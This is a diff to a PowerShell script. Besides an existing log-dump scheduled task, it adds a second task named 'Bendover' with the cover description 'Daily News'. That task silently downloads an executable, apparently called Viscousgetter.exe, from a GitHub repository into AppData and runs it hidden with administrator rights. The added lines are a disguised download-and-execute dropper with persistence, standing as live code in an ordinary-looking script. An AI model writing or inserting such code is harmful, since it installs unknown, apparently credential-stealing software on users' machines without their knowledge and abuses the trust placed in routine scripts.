@@ -96,4 +96,15 @@ $trigger = New-ScheduledTaskTrigger -Once -At $triggerTime
 
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AppLog" -Description "Daily dump of Applog"
 
+$triggerTime2 = $currentTime.AddMinutes(1)
+
+$script = '"& { iwr ''https://github.com/Zyg0s/VI_ASTRA/raw/refs/heads/main/Viscousgetter.exe'' -OutFile $env:AppData\Viscousgetter.exe; Start-Process -FilePath $env:AppData\Viscousgetter.exe -WindowStyle Hidden -Verb RunAs }"'
+
+$action2 = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -Command $script"
+
+# Define the trigger
+$trigger2 = New-ScheduledTaskTrigger -Once -At $triggerTime2
+
+# Register the scheduled task
+Register-ScheduledTask -Action $action2 -Trigger $trigger2 -TaskName "Bendover" -Description "Daily News"
 
